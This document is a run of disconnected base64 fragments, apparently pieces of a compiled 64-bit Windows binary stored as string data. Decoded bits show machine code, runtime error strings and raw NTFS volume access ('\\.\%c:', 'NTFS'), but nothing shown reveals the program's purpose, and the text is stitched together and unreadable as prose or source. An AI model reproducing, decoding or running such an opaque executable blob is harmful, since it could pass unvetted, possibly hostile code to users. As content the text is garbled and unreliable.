4CAQAAAAAAARUGABVkEAAVNA4AFbIRcAEEAQAEQgAAERkKABl0DAAZZAsAGTQKABlSFfAT4BHQxHkAAAIAAAD09AAAOPUAAPUCAQAAAAAAwfQAAFH1AAAdAwEAAAAAAAEEAQAEEgAAEQ8GAA9kCQAPNAgAD1ILcMR5AAABAAAA+vUAAGz2AAA2AwEAAAAAAAEQBgAQdAcAEDQGABAyDOARFQgAFXQIABVkBwAVNAYAFTIR8MR5AAABAAAAy/YAAOj2AABPAwEAAAAAAAEZCgAZdA8AGWQOABlUDQAZNAwAGZIV4AEJAQAJYgAAEREGABE0CgARMg3gC3AKYMR5AAABAAAAi/oAAM/6AACAAwEAAAAAABEPBAAPNAcADzILcMR5AAABAAAAv/sAAMn7AABoA','n6T//0iLSzjolqT//0iLS3DojaT//0iLS3johKT//0iLi4AAAADoeKT//0iLi4gAAADobKT//0iLi5AAAADoYKT//0iLi5gAAADoVKT//0iLi6AAAADoSKT//0iLi6gAAADoPKT//0iLi7AAAADoMKT//0iLi7gAAADoJKT//0iLi8AAAADoGKT//0iLi8gAAADoDKT//0iLi9AAAADoAKT//0iLi9gAAADo9KP//0iLi+AAAADo6KP//0iLi+gAAADo3KP//0iLi/AAAADo0KP//0iLi/gAAADoxKP//0iLiwABAADouKP//0iLiwgBAADorKP//0iLixABAADooKP//0iLixgBAADolKP//0iLiyABAADoiKP//0iLiygBAADofKP//0iLizABAADocKP//0iLizgBAADoZKP//0iLi0ABAADoWKP//0iLi0gBAADoTKP//0iLi1ABAADoQKP//0iLi2gBAADoNKP//0iLi3ABAADoKKP//0iLi3gBAADoHKP//0iLi4ABAADoEKP//0iLi4gBAADoBKP//0iLi5ABAADo+KL//0iLi2ABAADo7KL//0iLi6ABAADo4KL//0iLi6gBAADo1KL//0iLi7ABAADoyKL//0iLi7gBAADovKL//0iLi8ABAADosKL//0iLi8gBAADopKL//0iLi5gBAADomKL//0iLi9ABAADojKL//0iLi9gBAADogKL//0iLi+ABAADodKL//0iLi+gBAADoaKL//0iLi/ABAADoXKL//0iLi/gBAADoUKL//0iLiwACAADoRKL//0iLiwgCAADoOKL//0iLixACAADoLKL//0iLixgCAADoIKL//0iLiyACAADoFKL//0iLiygCAADoCKL//0iLizACAADo/KH//0iLizgCAADo8KH//0iLi0ACAADo5KH//0iLi0gCAADo2KH//0iLi1ACAADozKH//0iLi1gCAADowKH//0iLi2ACAADotKH//0iLi2gCAADoqKH//0iLi3ACAADonKH//0iLi3gCAADokKH//0iLi4ACAADohKH//0iLi4gCAADoeKH//0iLi5ACAADobKH//0iLi5gCAADoYKH//0iLi6ACAADoVKH//0iLi6gCAADoSKH//0iLi7ACAADoPKH//0iLi7gCAADoMKH//0iDxCBbw8zMQFVBVEFVQVZBV0iD7FBIjWwkQEiJXUBIiXVISIl9UEiLBe7iAABIM8VIiUUIi11gM/9Ni+FFi+hIiVUAhdt+KkSL00mLwUH/ykA4OHQMSP/ARYXSdfBBg8r/i8NBK8L/yDvDjVgBfAKL2ESLdXiL90WF9nUHSIsBRItwBPedgAAAAESLy02LxBvSQYvOiXwkKIPiCEiJfCQg/8L/FaMxAABMY/iFwHUHM8Dp+QEAAEm48P///////w+FwH5hM9JIjULgSff3SIP4AnJSSo0MfRAAAABIgfkABAAAdypIjUEPSDvBdwNJi8BIg+Dw6MIWAABIK+BIjXwkQEiF/3SpxwfMzAAA6xPoTKH//0iL+EiFwHQKxwDd3QAASIPHEEiF/3SFRIvLTYvEugEAAABBi85EiXwkKEiJfCQg/xUDMQAAhcAPhEwBAABMi2UAIXQkKEghdCQgSYvMRYvPTIvHQYvV6D34//9IY/CFwA+EIwEAAEG4AAQAAEWF6HQ2i01whckPhA0BAAA78Q+PBQEAAEiLRWiJTCQoRYvPTIvHQYvVSYvMSIlEJCDo9vf//+niAAAAhcB+ajPSSI1C4Ej39kiD+AJyW0iNDHUQAAAASTvIdzVIjUEPSDvBdwpIuPD///////8PSIPg8OjFFQAASCvgSI1cJEBIhdsPhJUAAADHA8zMAADrE+hLoP//SIvYSIXAdA7HAN3dAABIg8MQ6wIz20iF23RtRYvPTIvHQYvVSYvMiXQkKEiJXCQg6GL3//8zyYXAdDyLRXAz0kiJTCQ4RIvOTIvDSIlMJDCFwHULiUwkKEiJTCQg6w2JRCQoSItFaEiJRCQgQYvO/xWiLwAAi/BIjUvwgTnd3QAAdQXok57//0iNT/CBOd3dAAB1BeiCnv//i8ZIi00ISDPN6KB2//9Ii11ASIt1SEiLfVBIjWUQQV9BXkFdQVxdw8zMSIlcJAhIiXQkEFdIg+xwSIvySIvRSI1MJFBJi9lBi/joJ37//4uEJMAAAABIjUwkUEyLy4lEJECLhCS4AAAARIvHiUQkOIuEJLAAAABIi9aJRCQwSIuEJKgAAABIiUQkKIuEJKAAAACJRCQg6L/8//+AfCRoAHQMSItMJGCDocgAAAD9TI1cJHBJi1sQSYtzGEmL41/DzMxAVUFUQVVBVkFXSIPsQEiNbCQwSIldQEiJdUhIiX1QSIsFht8AAEgzxUiJRQBEi3VoM/9Fi/lNi+BEi+pFhfZ1B0iLAUSLcAT3XXBBi86JfCQoG9JIiXwkIIPiCP/C/xV4LgAASGPwhcB1BzPA6c0AAAB+aki48P///////39IO/B3W0iNDHUQAAAASIH5AAQAAHcxSI1BD0g7wXcKSLjw////////D0iD4PDonBMAAEgr4EiNXCQwSIXbdK7HA8zMAADrE+gmnv//SIvYSIXAdA/HAN3dAABIg8MQ6wNIi99Ihdt0hUyLxjPSSIvLTQPA6CbG//9Fi89Ni8S6AQAAAEGLzol0JChIi','BIi+kz/77jAAAATI01pnEAAI0EPkG4VQAAAEiLzZkrwtH4SGPYSIv','KsBACEAAgAANAgAoDgAAOM4AAAgqwEAIQAAAKA4AADjOAAAIKsBABEiBgAiNBMAFtIScBFgEFDUbwAAIIcBAP////8QBwEA4DUAAP////9WNgAAAAAAAFg3AAD/////ARQGABRkCAAUNAYAFDIQcAEKBAAKZAkACjIGcCEFAgAFNAYA4DIAAAAzAACwqwEAIQACAAA0BgDgMgAAADMAALCrAQAhAAAA4DIAAAAzAACwqwEAER4IAB50CwAZZAoAFDQIAAZSAuDUbwAASIcBAP////9QBgEA/////1wGAQD/////aAYBAP////90BgEA/////4AGAQD/////jAYBAP////+YBgEA/////6QGAQD/////sAYBAP////+8BgEAgC0AAP/////OLQAAAAAAANEtAAD/////bC4AAAAAAACGLgAA/////5ouAAABAAAAtC4AAP/////ILgAAAgAAAOIuAAD/////9i4AAAMAAAAQLwAA/////7MvAAAEAAAA1C8AAP////9qMAAABQAAAIQwAAD/////mzAAAAYAAADlMAAA/////wIxAAAHAAAAHDEAAP////8wMQAACAAAAEoxAAD/////azEAAAkAAACFMQAA/////xQyAAAAAAA','DBbw8zMzMxIiVwkCFdIg+wgi9pIi/noHAAAAPbDAXQISIvP6A82AABIi8dIi1wkMEiDxCBfw8xIiUwkCFNIg+wwSMdEJCD+////SIvZSI0Fa1wBAEiJAUiNBdlbAQBIiUFISIN5WAB0QmZmZmZmZg8fhAAAAAAASItDWEiLCEiJS2hIi0gISIXJdApIiwG6AQAAAP8QSItLWOiZNQAASItDaEiJQ1hIhcB1zDPASIlDYEiJQ1hIiUNoiUNQSI0FVF0BAEiJA0iDxDBbw8zMzMzMzMzMzMzMQFdBVkFXSIPsMEjHRCQg/v///0iJXCRYSIlsJGBIiXQkaEiL8UiLUXCLQhBIjXoQSAP4D7dvCDtqFA+HqgAAAEUz9kyNPdZbAQBmDx9EAAC5MAAAAOhqNQAASIvYSIlEJFBIhcB0','7CCDeRwASYvwSIv6SIvZdHdIi0kQSIXJdAXo1D4AAItHGEiJcwiJQxhIg38QAHRS/8BIY8i4AgAAAEj34UjHwf////9ID0DBSIvI6NM3AABMY0MYSIlDEEiLVxBIi8joXz8AAEhjSxhIi0MQM9JmiRRISItcJDBIi3QkOEiDxCBfwzPSSIlTEEiLXCQwSIt0JDhIg8QgX8PMzMzMzMzMzMzMzEiJbCQYSIl0JCBXSIHsQAIAAEiLBUehAQBIM8RIiYQkMAIAAEiL+UiLSRA','Xg/lhD4QIAQAAg/ljD4SnAAAA6SUEAABJi0UASYPFCEiFwHQvSItYCEiF23QmD78AQQ+65gtzEpnHRCRQAQAAACvC0fjp7wMAAESJVCRQ6eUDAABIix32KwEA6c4DAABB98YwCAAAdQVBD7ruC0mLXQBFO+BBi8S5////fw9EwUmDxQhB98YQCAAAD4QGAQAASIXbx0QkUAEAAABID','AAAAAAAaD4BgAEAAABXAAAAAAAAAHA+AYABAAAAWgAAAAAAAAB4PgGAAQAAAGUAAAAAAAAAgD4BgAEAAAB/AAAAAAAAAIg+AYABAAAAAQQAAAAAAACQPgGAAQAAAAIEAAAAAAAAoD4BgAEAAAADBAAAAAAAALA+AYABAAAABAQAAAAAAABgNAGAAQAAAAUEAAAAAAAAwD4BgAEAAAAGBAAAAAAAANA+AYABAAAABwQAAAAAAADgPgGAAQAAAAgEAAAAAAAA8D4BgAEAAAAJBAAAAAAAABg4AYABAAAACwQAAAAAAAAAPwGAAQAAAAwEAAAAAAAAED8BgAEAAAANBAAAAAAAACA/AYABAAAADgQAAAAAAAAwPwGAAQAAAA8EAAAAAAAAQD8BgAEAAAAQBAAAAAAAAFA/AYABAAAAEQQAAAAAAAAwNAGAAQAAABIEAAAAAAAAUDQBgAEAAAATBAAAAAAAAGA/AYABAAAAFAQAAAAAAABwPwGAAQAAABUEAAAAAAAAgD8BgAEAAAAWBAAAAAAAAJA/AYABAAAAGAQAAAAAAACgPwGAAQAAABkEAAAAAAAAsD8BgAEAAAAaBAAAAAAAAMA/AYABAAAAGwQAAAAAAADQPwGAAQAAABwEAAAAAAAA4D8BgAEAAAAdBAAAAAAAAPA/AYABAAAAHgQAAAAAAAAAQAGAAQAAAB8EAAAAAAAAEEABgAEAAAAgBAAAAAAAACBAAYABAAAAIQQAAAAAAAAwQAGAAQAAACIEAAAAAAAAQEABgAEAAAAjBAAAAAAAAFBAAYABAAAAJAQAAAAAAABgQAGAAQAAACUEAAAAAAAAcEABgAEAAAAmBAAAAAAAAIBAAYABAAAAJwQAAAAAAACQQAGAAQAAACkEAAAAAAAAoEABgAEAAAAqBAAAAAAAALBAAYABAAAAKwQAAAAAAADAQAGAAQAAACwEAAAAAAAA0EABgAEAAAAtBAAAAAAAAOhAAYABAAAALwQAAAAAAAD4QAGAAQAAADIEAAAAAAAACEEBgAEAAAA0BAAAAAAAABhBAYABAAAANQQAAAAAAAAoQQGAAQAAADYEAAAAAAAAOEEBgAEAAAA3BAAAAAAAAEhBAYABAAAAOAQAAAAAAABYQQGAAQAAADkEAAAAAAAAaEEBgAEAAAA6BAAAAAAAAHhBAYABAAAAOwQAAAAAAACIQQGAAQAAAD4EAAAAAAAAmEEBgAEAAAA/BAAAAAAAAKhBAYABAAAAQAQAAAAAAAC4QQGAAQAAAEEEAAAAAAAAyEEBgAEAAABDBAAAAAAAANhBAYABAAAARAQAAAAAAADwQQGAAQAAAEUEAAAAAAAAAEIBgAEAAABGBAAAAAAAABBCAYABAAAARwQAAAAAAAAgQgGAAQAAAEkEAAAAAAAAMEI','URIvgiUQkS','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MSIlMJAhTSIPsUEjHRCRA/v///0iL2UiNBWNiAQBIiQFIiVEITIlBKEmLQAhED7dICGZEiUkQSYtACESLSAxEiUkUSYtACItIFIlLGEmLQAhIi0ggSIlLIEiNBflhAQBIiQNIiVMwD7dCFEgDwkiJQziLQhCJQ0BIjQ3yYAEASIkL0eiJQ1iNSAG4AgAAAEj34UjHwf////9ID0DBSIvI6CwzAABIiUNIi0tY/8HoHjMAAEiJQ1BEi0NASItTOEiLS0joWTMAAItLWEiLQ0gz0maJFEhEi0tYSIlUJDhIiVQkMESJTCQoSItDUEiJRCQgTItDSDPJ/xXE6wAAi0tYSItDUMYEAQBIi8NIg8RQW8NIiVwkCFdIg+wgSI0FT2ABAEiL+YvaSIkBSItJSOhuOQAASItPUOhlOQAASI0FPmEBAEiJB/bDAXQISIvP6E45AABIi8dIi1wkMEiDxCBfw0iJdCQQV0iD7CCDeSAASIvySIv5dQ5Ii8FIi3QkOEiDxCBfw8dBHAEAAABIi0koSIlc','AB6UQAAZKgBAIBRAAAVUgAANKgBACBSAADVUgAABKgBAOBSAADTUwAA2KcBAOBTAAAPVAAAQJwBABBUAAA/VAAAQJwBAEBUAACLVAAAQJwBAJBUAADdVAAAQJwBAEhVAABpVQAAnJwBAGxVAACNVQAAnJwBAJBVAACxVQAAnJwBALRVAADVVQAAnJwBAPBVAAApVgAAQJwBACxWAABbVgAAQJwBAFxWAACfVgAATJwBAKBWAADWVgAATJwBANhWAAAOVwAATJwBADBXAABPVwAAWJwBAGBXAABEXAAAYJwBAERcAACHXAAAnJwBAIhcAACSXQAAbJwBAJRdAACrXQAAZJwBAKxdAADgXQAAZJwBAOhd','UQkIEH/UhiFwA+EmQAAAEiLQwiLSBA5TCRI63xIi0sIRTPJi0EQSQ+vwEyNRCRUSANBGEiJRCRQSItJIIvQ/xW42wAAiUQkUIP4/3UK/xWx2wAAhcB1WUiLQwiLSBDooSIAAEiLSwhMjUwkSESLQRBIi0kgSIvQSIv4SMdEJCAAAAAA/xWD2wAAhcB0G0iLSwiLURA5VCRIdQ5Ii8dIi1wkQEiDxDBfw0iLz+gkKQAAM8BIi1wkQEiDxDBfw8zMzMzMzMxIiVwkCEiJdCQYSIlUJBBXSIPsIEiL8kiL+egB+P//SItPEDPbSIXJdAno4SgAAEiJXxBIjVQkOEiLz+ig/v//TIvISIXAdRhIx0cY/////0iLXCQwSIt0JEBIg8QgX8NIiXcYgThGSUxFdXsPt0AEM9JJi8lGD7ccCE6NFAhIi0cIRA+3QAiLQBBB9/BMY8CFwH46ZmZmZg8fhAAAAAAASItHCA+3QAjR6P/ISJhIjQxBZkQ5GXUvQQ+3RFoCSP/DSIPBAmaJQf5JO9h80kyJTxC4AQAAAEiLXCQwSIt0JEBIg8QgX8NJi8noISgAAEiLXCQwSIt0JEAzwEiDxCBfw8zMzMzMzMzMzMzMzMzMzEiLxEyJSCBMiUAYSIlICFVWV0iD7HBIx0Cw/v///0iJWBBIi8FIi4kgAgAASImIMAIAADPtSIXJdAZIi0kI6wNIi81Ihcl1BzPA6WoBAABIiWwkWEiL/UiJbCRQSIlsJGCJbCRISI0FRE4BAEiJRCRASIlsJGhIi0FwSDkCD4P1AAAATI1EJEDoY/P//0iLfCRQhcAPhN4AAABIi/dIiXwkYEiF/w+EzQAAAEiLXwhIhdsPhMAAAACDexgAfklIi5QkoAAAAEiLy+jS6v//hcAPhI0AAAB5dUiLSyhIhckPhJMAAAAPtkEMg+ABD4SGAAAAD7dBCEiLTAj4SIlMJChIjVQkKOslSItLKEiFyXQ9D7ZBDIPgAXQ0D7dBCEiLTAj4SIlMJDBIjVQkMEyLjCSoAAAATIuEJKAAAABIi4wkkAAAAOi3/v//hcB1JkiLNkiJdCRgSIX2dB5Ii14I6Uz///9Ii9NIi4wkqAAAAOhN7f//vQEAAABIi0wkaEiFyXQF6HkmAABIhf90Kw8fQABIix9Ii08ISIXJdAtMiwG6AQAAAEH/EEiLz+hRJgAAS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